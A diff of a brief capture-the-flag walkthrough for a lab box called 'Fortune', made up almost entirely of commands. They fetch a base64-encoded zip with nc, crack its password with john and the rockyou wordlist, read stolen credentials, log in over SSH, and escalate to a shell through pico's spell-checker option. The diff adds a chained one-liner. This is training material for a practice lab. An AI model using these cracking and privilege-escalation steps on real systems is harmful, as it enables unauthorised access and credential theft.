@@ -1,10 +1,11 @@
 # Fortune
 1. `nc fortune.thm 3333 | base64 -d > test.zip`
-2. `zip2john test.zip > hash`
-3. `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
+2. `zip2john test.zip > for_john`
+3. `john for_john --wordlist=/usr/share/wordlists/rockyou.txt`
 4. `unzip test.zip`
 5. `cat creds.txt`
 6. `ssh fortuna@fortune.thm`
+7. `nc fortune.thm 3333 | base64 -d > test.zip && zip2john test.zip > for_john && john for_john --wordlist=/usr/share/wordlists/rockyou.txt && unzip test.zip&& cat creds.txt`
 ## Priv. Esc.
 ### Method 1
 1. `pico -s /bin/sh` type `/bin/sh` and `CTRL+T`
